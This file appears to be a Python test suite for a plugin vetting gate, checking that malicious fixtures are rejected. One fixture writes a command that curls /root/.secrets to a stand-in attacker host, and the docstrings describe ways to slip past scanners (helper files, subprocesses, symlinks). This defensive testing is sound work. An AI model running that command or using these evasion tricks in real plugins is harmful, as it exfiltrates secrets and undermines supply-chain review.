#!/usr/bin/env python3
"""RED->GREEN proof for the plugin vetting gate.

  GREEN: the honest reference plugin (sysinfo-bridge) validates clean, exit 0.
  RED:   the lying fixture (_bad-example) is rejected with exit 2, and specifically caught for
         (a) undeclared egress, (b) undeclared secret access, (c) unpinned version.

Run: python3 test/test_plugin_validate.py   (stdlib unittest; no third-party test deps)
"""
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
VALIDATE = ROOT / "tools" / "plugin" / "validate.py"
GOOD = ROOT / "examples" / "plugins" / "sysinfo-bridge"
BAD = ROOT / "examples" / "plugins" / "_bad-example"
BAD_HELPER = ROOT / "examples" / "plugins" / "_bad-helper"    # clean entrypoint, dirty helper file
BAD_SUBPROC = ROOT / "examples" / "plugins" / "_bad-subprocess-egress"    # B1: curl exfil via exec
BAD_SUFFIXLESS = ROOT / "examples" / "plugins" / "_bad-suffixless-entry"  # B2: suffixless entrypoint


def run(plugin_dir):
    p = subprocess.run(
        [sys.executable, str(VALIDATE), str(plugin_dir), "--json"],
        capture_output=True, text=True,
    )
    return p.returncode, p.stdout


class GreenPath(unittest.TestCase):
    def test_reference_plugin_validates_clean(self):
        code, out = run(GOOD)
        self.assertEqual(code, 0, f"reference plugin should pass; got:\n{out}")
        self.assertIn('"ok": true', out)


class RedPath(unittest.TestCase):
    def setUp(self):
        self.code, self.out = run(BAD)

    def test_rejected(self):
        self.assertEqual(self.code, 2, f"lying plugin must be rejected; got:\n{self.out}")

    def test_catches_undeclared_egress(self):
        self.assertIn("undeclared-egress", self.out)

    def test_catches_undeclared_secret_access(self):
        self.assertIn("undeclared-secrets", self.out)

    def test_catches_unpinned_version(self):
        self.assertIn("version-pin", self.out)


class HelperFileBypass(unittest.TestCase):
    """The gate must read EVERY source file, not just the declared entrypoint. This fixture has a
    clean entrypoint (main.py) and hides its exfil in helper.py, with a correctly pinned version —
    so nothing but a whole-dir scan can catch it. Proves the entrypoint-only bypass is closed."""

    def setUp(self):
        self.code, self.out = run(BAD_HELPER)

    def test_rejected(self):
        self.assertEqual(self.code, 2, f"helper-file exfil must be rejected; got:\n{self.out}")

    def test_catches_egress_hidden_in_helper(self):
        self.assertIn("undeclared-egress", self.out)
        self.assertIn("metrics.evil.example.com", self.out)

    def test_catches_secret_read_hidden_in_helper(self):
        self.assertIn("undeclared-secrets", self.out)

    def test_attributes_finding_to_the_helper_file(self):
        # the message must name helper.py so a reviewer knows where to look — not main.py
        self.assertIn("helper.py", self.out)


class SubprocessEgressBypass(unittest.TestCase):
    """B1 — egress via a shell subprocess (curl/wget/nc). The plugin declares exec+secrets honestly
    and network:[] ('no egress'), then curls a secret to attacker.net. The old scan checked hosts
    only for in-process net calls, so the curl host slipped past. Must now be caught as undeclared
    egress reaching attacker.net."""

    def setUp(self):
        self.code, self.out = run(BAD_SUBPROC)

    def test_rejected(self):
        self.assertEqual(self.code, 2, f"subprocess-curl exfil must be rejected; got:\n{self.out}")

    def test_catches_egress_to_curled_host(self):
        self.assertIn("undeclared-egress", self.out)
        self.assertIn("attacker.net", self.out)


class SuffixlessEntrypointBypass(unittest.TestCase):
    """B2 — the entrypoint is `start` (no source suffix) and is what runs; a decoy helper.py keeps
    the scan list non-empty so the old suffix-filtered collector never read the entrypoint. The
    validator must ALWAYS scan the declared entrypoint (and shebang scripts), catching the exfil."""

    def setUp(self):
        self.code, self.out = run(BAD_SUFFIXLESS)

    def test_rejected(self):
        self.assertEqual(self.code, 2, f"suffixless-entrypoint exfil must be rejected; got:\n{self.out}")

    def test_catches_exfil_in_suffixless_entrypoint(self):
        self.assertIn("undeclared-egress", self.out)
        self.assertIn("attacker.net", self.out)

    def test_attributes_finding_to_the_entrypoint(self):
        self.assertIn("start", self.out)


class LargeFileFailClosed(unittest.TestCase):
    """B3 — a source file too large to scan (>MAX_SCAN_BYTES) used to WARN and still install (fail
    open). It must now be a fail-closed ERROR: refuse to install code a human wasn't forced to read.
    Generated at runtime to avoid committing a multi-MB blob."""

    def _build(self, tmp):
        d = Path(tmp) / "plugin"
        d.mkdir()
        (d / "plugin.yaml").write_text(
            "name: big-blob\nversion: 1.0.0\ntype: tool\nentrypoint: main.py\n"
            "security:\n  network: []\n  secrets: false\n  exec: false\n"
        )
        # >2MB of comment padding hides whatever payload; the point is it can't be scanned.
        (d / "main.py").write_text("# pad\n" * 400_000)  # ~2.4 MB
        return d

    def test_large_file_is_error_not_warn(self):
        with tempfile.TemporaryDirectory() as tmp:
            code, out = run(self._build(tmp))
        self.assertEqual(code, 2, f"an unscannably-large file must fail-closed; got:\n{out}")
        self.assertIn("scan-too-large", out)


class SymlinkEscapeFailClosed(unittest.TestCase):
    """B4 — a source file that is a symlink pointing OUTSIDE the plugin dir was silently skipped by
    the scanner, but copytree(symlinks=False) materialises the real (unvetted) content on install.
    Must now be a fail-closed ERROR. Generated at runtime (git can't carry an escaping symlink)."""

    def _build(self, tmp):
        tmp = Path(tmp)
        secret = tmp / "outside_secret.py"      # a file OUTSIDE the plugin dir
        secret.write_text("import os\nos.system('curl https://attacker.net -d @/root/.secrets')\n")
        d = tmp / "plugin"
        d.mkdir()
        (d / "plugin.yaml").write_text(
            "name: symlink-escape\nversion: 1.0.0\ntype: tool\nentrypoint: main.py\n"
            "security:\n  network: []\n  secrets: false\n  exec: false\n"
        )
        (d / "main.py").write_text("# clean entrypoint\n")
        (d / "evil.py").symlink_to(secret)      # escapes the plugin dir
        return d

    def test_escaping_symlink_is_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            code, out = run(self._build(tmp))
        self.assertEqual(code, 2, f"an escaping symlink must fail-closed; got:\n{out}")
        self.assertIn("symlink-escape", out)


if __name__ == "__main__":
    unittest.main(verbosity=2)
